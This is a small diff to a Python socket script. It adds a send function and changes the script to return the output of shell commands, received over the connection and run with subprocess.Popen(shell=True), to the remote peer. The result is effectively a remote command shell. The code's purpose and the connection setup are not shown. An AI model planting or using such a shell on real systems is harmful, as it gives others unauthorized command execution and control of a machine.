@@ -17,6 +17,14 @@ def recv(conn):
         msg = conn.recv(msg_length).decode(FORMAT)
         return msg
 
+def send(msg, conn):
+    message = msg.encode(FORMAT)
+    msg_length = len(message)
+    send_length = str(msg_length).encode(FORMAT)
+    send_length += b' ' * (HEADER - len(send_length))
+    conn.send(send_length)
+    conn.send(message)
+    print(recv(conn))
 
 connected = True
 while connected:
@@ -24,4 +32,4 @@ while connected:
 
     proc = subprocess.Popen(msg.split(" "), stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
-    print("Program Output: ", out)
+    send(str(out), client)
